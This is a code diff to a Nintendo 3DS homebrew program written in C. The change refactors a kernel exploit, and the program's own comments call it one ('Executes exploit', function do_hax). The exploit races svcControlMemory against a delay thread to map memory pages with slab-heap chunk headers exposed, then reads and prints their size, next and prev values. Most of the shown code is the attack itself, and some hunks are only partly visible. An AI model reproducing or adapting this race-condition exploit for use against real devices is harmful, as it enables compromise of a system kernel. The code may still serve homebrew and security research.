@@ -1,6 +1,7 @@
 #include <3ds.h>
 
 #include <stdio.h>
+#include <stdlib.h>
 
 #define SLAB_HEAP 0xFFF70000
 #define PAGE_SIZE 0x1000
@@ -8,13 +9,11 @@
 extern u32 __ctru_heap;
 extern u32 __ctru_heap_size;
 
-static u32 memAddr = 0;
-static u32 memSize = 0;
-
 static Result control_res = -1;
 
 // Thread function to slow down svcControlMemory execution.
 void delay_thread(void* arg) {
+    // Slow down thread execution until the control operation has completed.
     while(control_res == -1) {
         svcSleepThread(10000);
     }
@@ -22,28 +21,53 @@ void delay_thread(void* arg) {
 
 // Thread function to allocate memory pages.
 void allocate_thread(void* arg) {
+    u32* memInfo = (u32*) arg;
+    if(memInfo == NULL) {
+        // Don't try to use invalid memory information.
+        return;
+    }
+
+    // Allocate the requested pages.
     u32 tmp;
-    control_res = svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+    control_res = svcControlMemory(&tmp, memInfo[0], 0, memInfo[1], MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
+
+    // Free memory information.
+    free(memInfo);
 }
 
 // Maps pages with chunk headers present.
 void map_raw_pages(u32 memAddr, u32 memSize) {
+    // Reset control result.
+    control_res = -1;
+
+    // Prepare memory information.
+    u32* memInfo = (u32*) malloc(sizeof(u32) * 2);
+    memInfo[0] = memAddr;
+    memInfo[1] = memSize;
+
+    // Retrieve arbiter.
     Handle arbiter = __sync_get_arbiter();
 
     // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
     threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
     // Create thread to allocate pages.
-    threadCreate(allocate_thread, NULL, 0x4000, 0x3F, 1, true);
+    threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);
 
     // Use svcArbitrateAddress to detect when the memory page has been mapped.
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
 }
 
+void wait_map_complete() {
+    while(control_res == -1) {
+        svcSleepThread(1000000);
+    }
+}
+
 // Executes exploit.
 void do_hax() {
     // Prepare necessary info.
-    memAddr = __ctru_heap + __ctru_heap_size;
-    memSize = PAGE_SIZE * 2;
+    u32 memAddr = __ctru_heap + __ctru_heap_size;
+    u32 memSize = PAGE_SIZE * 2;
 
     // Map the pages.
     map_raw_pages(memAddr, memSize);
@@ -60,11 +84,9 @@ void do_hax() {
     printf("\"Size\" value: %08X\n", (int) size);
     printf("\"Next\" value: %08X\n", (int) next);
     printf("\"Prev\" value: %08X\n", (int) prev);
-
     printf("Post-overwrite control result: %08X\n", (int) control_res);
-    while(control_res == -1) {
-        svcSleepThread(1000000);
-    }
+
+    wait_map_complete();
 
     printf("Final control result: %08X\n", (int) control_res);
 
